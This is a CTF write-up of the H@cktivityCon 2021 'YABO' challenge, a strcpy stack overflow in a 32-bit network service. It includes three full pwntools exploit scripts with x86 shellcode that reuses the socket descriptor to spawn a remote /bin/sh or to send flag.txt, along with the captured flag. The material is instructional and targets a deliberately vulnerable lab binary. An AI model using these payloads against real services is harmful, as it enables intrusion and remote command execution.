# H@cktivityCon 2021 CTF

## YABO

> Yet Another Buffer Overflow.  
>  
> 478  
>  
> [`retcheck`](retcheck)  
>  
> author: @M_alpha#3534

Tags: _pwn_ _bof_ _shellcode_ _x86_ _remote-shell_

## Summary

Basic shellcode, however with `recv`/`send`, vs. `stdin`/`stdout`/`socat`.

## Analysis

### Checksec

```  
   Arch:     i386-32-little  
   RELRO:    No RELRO  
   Stack:    No canary found  
   NX:       NX disabled  
   PIE:      No PIE (0x8048000)  
   RWX:      Has RWX segments  
```

No mitigations; choose your own adventure.  Well, maybe, ROP is out, and
you'll see why soon.  Also this would have been much harder if 64-bit (same
reason why ROP is out).  So this was clearly designed to be a shellcoding
challenge.  

### Decompile with Ghidra

```c  
void vuln(int param_1)  
{  
 char local_414 [1024];  
 ssize_t local_14;  
 char *local_10;  
  
 local_10 = (char *)0x0;  
 local_10 = (char *)malloc(0xf00);  
 if (local_10 == (char *)0x0) {  
   perror("Memory error");  
 }  
 else {  
   send(param_1,"What would you like to say?: ",0x1d,0);  
   local_14 = recv(param_1,local_10,0xeff,0);  
   if (local_14 == -1) {  
     perror("recv error");  
     free(local_10);  
   }  
   else {  
     strcpy(local_414,local_10);  
   }  
 }  
 return;  
}  
```

The vuln is `strcpy`.  `strcpy` is copying a `0xf00` (3840) length buffer
(`local_10`) into a 1024 length buffer (`local_414`).  And that `strcpy` will
copy until a NULL is reached and can smash the stack.

> BTW, it is that NULL check that makes ROP [almost] impossible.  Any argument
> to a function that has NULLs will terminate the `strcpy` and our attack will
> fall short, e.g. to call `send` we need a file descriptor of `4`, well on
> the stack that will look like `0x00000004`, three NULLs.  This also creates
> challenges for 64-bit (x86-64), since x86-64 systems (today) only use 48-bit
> addresses, there will be two NULLs in every address on the stack.

To overflow the buffer and get to the stack we'll need to write out `0x414`
(see `local_414`) bytes and since `local_10` is `0xf00` in length, that's a
total payload of `2796` (`0xf00 - 0x414`) bytes.

> That's a _huge_ number of bytes, you could write an entire video game.  (Yes
> you can, Google for _boot sector games_.)

Before we get too excited, we'll need a ROP gadget to call our shellcode:

```  
# ropper --nocolor --file yabo | grep ': jmp esp'  
[INFO] Load gadgets from cache  
[LOAD] loading... 100%  
[LOAD] removing double gadgets... 100%  
0x080492e2: jmp esp;  
```

We're in luck, there's a `jmp esp` gadget we can use to call our shellcode.

> Usually we're looking for `jmp esp`, `call esp`, `jmp eax`, etc...

> If this were 64-bit we'd be hosed, since a `jmp rsp` gadget would have a
> 48-bit address and the double NULLs would drop the rest of our payload.

## Tooling

Since this is a network service vs. just a boring old CLI wrapped with `socat`
you'll need to work with it a bit differently.

### `strace`

To run standalone use `strace -f ./yabo`.  This will follow forks and you'll
be able to see and debug all your system calls.  For this type of challenge
this is much easier than GDB.

### GDB/GEF

Make sure to `set follow-fork-mode child` before running from GDB so that
you'll catch your breaks.

## Exploit

I'm going to provide three solution, from the last I developed, to the first.
All three are identical except for the shellcode used.

### Solution 3

```python  
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./yabo')

if args.REMOTE:  
   p = remote('challenge.ctf.games', 32332)  
else:  
   p = remote('127.0.0.1', 9999)

shellcode = asm(shellcraft.dupsh(4))

log.info('len(shellcode): ' + str(len(shellcode)))

jmp_esp = next(binary.search(asm('jmp esp')))

payload  = b''  
payload += 0x414 * b'A'  
payload += p32(jmp_esp)  
payload += shellcode

if payload.find(b'\0') != -1:  
   log.critical('NULL in payload, exiting!')  
   print(disasm(shellcode))  
   sys.exit(1)

p.sendlineafter(b'say?: ',payload)  
p.interactive()  
```

Up to the `shellcode` line it's standard pwntools header, however pwntools
does all the work for you with its `shellcraft.dupsh` widget.  You just need
to know the file descriptor to pass and that can be obtained from `strace`:

```  
[pid 29960] brk(NULL)                   = 0x895c000  
[pid 29960] brk(0x897d000)              = 0x897d000  
[pid 29960] brk(0x897e000)              = 0x897e000  
[pid 29960] send(4, "What would you like to say?: ", 29, 0) = 29  
[pid 29960] recv(4, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 3839, 0) = 1088  
```

See the `4` being passed to `send` and `recv`?  It will always be `4` (at
least for this challenge).

> The short of it is, file descriptors `0`, `1`, `2` are conventionally used
> for `stdin`, `stdout`, `stderr`.  For a challenge like this FD `3` is the
> socket listening to port `9999` (see `main`).  When you connect to port
> `9999` (FD `3`) the process is forked and that forked process has a copy of
> the FDs, so the next FD returned from the `accept` call will be `4`.  And in
> most CTF challenges like this, it is `4`.  That `4` is passed to the `vuln`
> function for `send` and `recv` use.

So what does `dupsh` do?  Well it will duplicate FDs so that any read/write to
FD's `0`, `1`, `2` will happen over FD `4` and thus over the network.  Boom!
Shell.

Continuing down, the next line just prints the length of the shellcode, this
is good practice for space constrained challenges (not a problem here).

Then we need to find the address of `jmp esp`.  Since no PIE, no leak
required.

The payload is pretty simple, overflow the buffer to get to the return address
(hint `local_414`), then our one line ROP chain of `jmp esp` to jump to the
stack and then our shellcode on the stack.

Next is a check for NULLs, if there is a NULL in the payload, it'll bomb out
with a disassembly so you can inspect your code.

Lastly we send the payload and get a shell.

Output:

```bash  
# ./exploit3.py REMOTE=1  
[*] '/pwd/datajerk/hacktivityctf2021/yabo/yabo'  
   Arch:     i386-32-little  
   RELRO:    No RELRO  
   Stack:    No canary found  
   NX:       NX disabled  
   PIE:      No PIE (0x8048000)  
   RWX:      Has RWX segments  
[+] Opening connection to challenge.ctf.games on port 32332: Done  
[*] len(shellcode): 58  
[*] Switching to interactive mode  
$ cat flag.txt  
flag{2f20f16416a066ca5d4247a438403f21}  
```

### Solution 2

This was my second solution, and it is functionally identical to the one
above, however I didn't know about `shellcraft.dupsh(4)`.  This will help
understand what is really going on and unlike `dupsh(4)`, the FD does not need
to be known; the code can figure it out.

```python  
from binascii import hexlify

arg0 = b'/bin/sh'

# props: http://shell-storm.org/shellcode/files/shellcode-881.php  
shellcode = asm(f'''  
/* dup(2) to get next fd, then dec for current */

push 2  
pop ebx  
push {constants.SYS_dup}  
pop eax  
int 0x80  
dec eax                                                 # should be current fd  
mov ebx, eax                                            # put in ebx for dup2

/* dup2(fd,0); dup2(fd,1); dup2(fd,2); */

xor ecx, ecx  
push {constants.SYS_dup2}  
pop eax  
int 0x80  
inc ecx  
push {constants.SYS_dup2}  
pop eax  
int 0x80  
inc ecx  
push {constants.SYS_dup2}  
pop eax  
int 0x80

/* shell */

mov ebx, {'-0x' + hexlify(arg0[4:][::-1]).decode()}     # because of nulls set
a neg, then use neg, then push to stack  
neg ebx  
push ebx  
push {'0x' + hexlify(arg0[0:4][::-1]).decode()}         # rest of path  
mov ebx, esp  
xor ecx, ecx                                            # ecx = 0  
xor edx, edx                                            # edx = 0  
push {constants.SYS_execve}  
pop eax  
int 0x80  
''')  
```

> [`exploit2.py`](exploit2.py) is identical to [`exploit3.py`](exploit3.py)
> above except the three sections above (`from ...`, `arg0 = ...`, and the
> `shellcode`).

I'll just focus on the shellcode.

The shellcode has three sections (ripped off from
[shellcode-881.php](http://shell-
storm.org/shellcode/files/shellcode-881.php)):

1. This section will use `dup(2)` to get the next FD, then decrement it to figure out that FD of `4`.  I like this approach if you have the space.  No need to hardcode. (If you've read many of my write ups I try very hard to not hard code anything, but I too can get lazy).  
2. This section does that FD duplication described above in Solution 3.  
3. This section is your standard fare get a shell shellcode with `execve` however instead of hardcoding `//bin/sh` so that you're stack aligned (assuming you `xor eax, eax; push eax` first to terminate your string), I went with something computer generated using the `arg0` above.  Now if I'd just used `/bin/sh` (7 bytes) I would have had a null as the MSB (most significant byte) and that would terminate the `strcpy`.  The trick is to send the negative then `neg` in your shellcode.  And I do not need to `xor eax, eax; push eax` to terminate the string since `/bin/sh` is already terminated (it's only 7 bytes).  Is this better?  No, just, IMHO, more readable and adaptable for other challenges.

I'm not going to explain the assembly language here.  IMHO it is very readable
as is, but if you cannot read it, then google for each op code, or watch a
YouTube video on Linux assembly language.  The stuff above will take you an
hour to learn.  After that just start reading others shellcode.

Output:

```  
# ./exploit2.py REMOTE=1  
[*] '/pwd/datajerk/hacktivityctf2021/yabo/yabo'  
   Arch:     i386-32-little  
   RELRO:    No RELRO  
   Stack:    No canary found  
   NX:       NX disabled  
   PIE:      No PIE (0x8048000)  
   RWX:      Has RWX segments  
[+] Opening connection to challenge.ctf.games on port 32332: Done  
[*] len(shellcode): 54  
[*] Switching to interactive mode  
$ cat flag.txt  
flag{2f20f16416a066ca5d4247a438403f21}  
```

### Solution 1

This was my original solution, it was the first thing I thought of to do, just
`open` `flag.txt` and use the `sendfile` syscall to send it.

```  
arg0 = b'./flag.txt'

shellcode = asm(f'''

/* open flag.txt */

xor eax, eax                                            # eax = 0  
xor ecx, ecx                                            # ecx = 0  
xor edx, edx                                            # edx = 0  
mov ebx, {'-0x' + hexlify(arg0[8:][::-1]).decode()}     # because of nulls set
a neg, then use neg, then push to stack  
neg ebx  
push ebx  
push {'0x' + hexlify(arg0[4:8][::-1]).decode()}         # rest of filename  
push {'0x' + hexlify(arg0[0:4][::-1]).decode()}  
mov ebx, esp                                            # ebx points to
./flag.txt  
mov al, {constants.SYS_open}                            # open file, eax will
have FD for open file  
int 0x80

/* use sendfile to, well, send the file */

mov ecx, eax                                            # mv open FD to ecx  
dec eax                                                 # fd from open  
mov ebx, eax                                            # now fd of accept  
push 50                                                 # length of flag?  
pop esi  
xor edx, edx                                            # zero edx, may not
been required since done above and not used  
xor eax, eax                                            # eax = 0  
mov al, 187                                             # sendfile syscall
(was not in pwn tools table)  
int 0x80  
''')  
```

This has two sections:

1. `open` the file.  I'm using the same trick from Solution 2 above for the file name, so I didn't have to hardcode it or use tricks like `././flag.txt` or `.///flag.txt` to get it to stack align.  After the `open` syscall, `eax` will have the FD of `./flag.txt`, I'll need that in the next step.  
2. Use `sendfile` to send the file.  Since I have the FD of the file, I just needed to `dec` to get the FD from `accept` (`4`).  So again, no need to hardcode anything.  The rest just sets up the parameters for the `sendfile` syscall.

Output:

```  
# ./exploit.py REMOTE=1  
[*] '/pwd/datajerk/hacktivityctf2021/yabo/yabo'  
   Arch:     i386-32-little  
   RELRO:    No RELRO  
   Stack:    No canary found  
   NX:       NX disabled  
   PIE:      No PIE (0x8048000)  
   RWX:      Has RWX segments  
[+] Opening connection to challenge.ctf.games on port 32332: Done  
[*] len(shellcode): 46  
flag{2f20f16416a066ca5d4247a438403f21}  
```

> Note this is the shortest shellcode of the three.  This challenge could have
> been harder by limiting the length of the shellcode.

## Epilogue

This is a great challenge for testing/learning various shellcode tricks,
ideas, codes, etc..  With these type of challenges lately I have just used
`open` and `sendfile` (mostly because of seccomp).  

Original writeup (https://github.com/datajerk/ctf-write-
ups/tree/master/hacktivityctf2021/yabo).